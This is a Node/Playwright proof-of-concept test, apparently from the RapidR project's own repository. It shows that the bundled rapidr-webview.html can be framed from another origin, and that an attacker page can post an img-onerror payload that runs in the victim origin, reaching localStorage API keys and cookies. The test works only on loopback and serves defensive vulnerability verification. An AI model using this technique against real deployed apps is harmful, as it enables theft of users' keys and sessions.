// PoC (SEC-34): rapidr-webview.html is a cross-origin-framable XSS gadget on
// a deployed RapidR web program's own origin (and on the RapidR Studio web
// origin, where the AI keys live). It is shipped in EVERY web bundle
// (rapidr_webbundle::page_files always adds it) and in the Studio web build
// (runtime/rapidr-webview.html).
//
// The file's whole body is:
//   addEventListener("message", function (e) {
//     if (e.source !== parent || !e.data || typeof e.data.__rapidr_webview_html !== "string") return;
//     document.open(); document.write(e.data.__rapidr_webview_html); document.close();
//   });
// It document.write()s whatever its PARENT posts, with no origin check and no
// CSP of its own. The intended parent is the program's own (same-origin)
// page, so the HTML is the program author's. But the file carries no
// frame-ancestors / X-Frame-Options: the generated _headers/.htaccess apply
// frame-ancestors 'self' only to index.html (lib.rs host_config_files; the
// comment says webview.html "must not get it"). A meta CSP cannot express
// frame-ancestors at all. So ANY site may frame
//   https://victim-app/rapidr-webview.html
// and, being the iframe's `parent`, post { __rapidr_webview_html: "<script>…" }.
// e.source === parent holds, the guard passes, and the attacker's markup runs
// in the victim app's origin: its localStorage (RWEBSTORAGE, QREGISTRY
// "rapidr.registry"; for Studio, dev.rapidr.keys.* API keys), cookies, same-
// origin fetches as the user.
//
// This PoC serves the REAL shipped file on one loopback origin (the "victim
// app") and an attacker page on a second loopback origin (different port =
// different origin). The attacker frames the victim's webview.html and posts
// a script that writes a proof into the victim origin's localStorage and
// beacons the victim origin. The victim server records the beacon, proving
// code executed in the victim's origin across the origin boundary.
//
//   node tests/security/open/webview_frame_xss.mjs
// Needs the repo's tests/node_modules (Playwright + chromium). Loopback only.

import { chromium } from "playwright";
import { createServer } from "node:http";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const repo = join(here, "..", "..", "..");
// The real file shipped in every bundle and in the Studio web build.
const webviewHtml = readFileSync(join(repo, "interpreter/rapidr-webbundle/web/rapidr-webview.html"), "utf8");

// Headers a bundle's host (Netlify/Cloudflare/Apache) would set on this file:
// the COMMON_HEADERS only. NOT frame-ancestors (that is index.html's alone).
const victimHeaders = {
  "X-Content-Type-Options": "nosniff",
  "Referrer-Policy": "strict-origin-when-cross-origin",
  "Cross-Origin-Opener-Policy": "same-origin",
  "Cross-Origin-Resource-Policy": "same-origin",
};

const beacons = [];
const victim = createServer((req, res) => {
  if (req.url.startsWith("/rapidr-webview.html")) {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8", ...victimHeaders });
    res.end(webviewHtml);
  } else if (req.url.startsWith("/XSS_PROOF")) {
    beacons.push(req.url);
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
  } else {
    res.writeHead(404);
    res.end("not found");
  }
});

await new Promise((r) => victim.listen(0, "127.0.0.1", r));
const victimPort = victim.address().port;
const victimOrigin = `http://127.0.0.1:${victimPort}`;

// The attacker page lives on a DIFFERENT origin (different port). It frames
// the victim's webview.html and, as that frame's parent, posts the payload.
// An <img onerror> (not a <script>) so the payload carries no literal
// </script> that would break the attacker page's own inline script when
// served; document.write runs the onerror in the victim origin all the same.
// It writes a proof into the victim origin's localStorage and beacons the
// victim origin (a same-origin fetch to the victim server) to prove it ran
// there.
const attackerPayload =
  `<img src=x onerror="try{localStorage.setItem('pwned_by_attacker',location.origin)}catch(e){};` +
  `fetch('/XSS_PROOF?origin='+encodeURIComponent(location.origin))">`;

const attackerPage = `<!doctype html><html><body>
<iframe id="f" src="${victimOrigin}/rapidr-webview.html"></iframe>
<script>
  const f = document.getElementById("f");
  f.addEventListener("load", () => {
    // We are this frame's parent; the handler accepts __rapidr_webview_html
    // from parent only, and that is us.
    f.contentWindow.postMessage({ __rapidr_webview_html: ${JSON.stringify(attackerPayload)} }, "*");
  });
</script>
</body></html>`;

const attacker = createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(attackerPage);
});
await new Promise((r) => attacker.listen(0, "127.0.0.1", r));
const attackerPort = attacker.address().port;
const attackerOrigin = `http://127.0.0.1:${attackerPort}`;

const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto(`${attackerOrigin}/`);
// Give the frame time to load and the payload to run.
await page.waitForTimeout(1500);

await browser.close();
victim.close();
attacker.close();

const proven = beacons.some((u) => u.includes(encodeURIComponent(victimOrigin)));
console.log(`victim origin:   ${victimOrigin}`);
console.log(`attacker origin: ${attackerOrigin}`);
console.log(`beacons to the victim origin: ${JSON.stringify(beacons)}`);
if (proven) {
  console.log("\nVULNERABLE: attacker markup executed in the victim app's own origin via rapidr-webview.html (cross-origin framing + parent postMessage).");
  process.exit(0);
} else {
  console.log("\nNOT reproduced: no attacker code ran in the victim origin (the gadget may be fixed: frame-ancestors on the file, or an origin/handshake check in rapidr-webview.html).");
  process.exit(1);
}
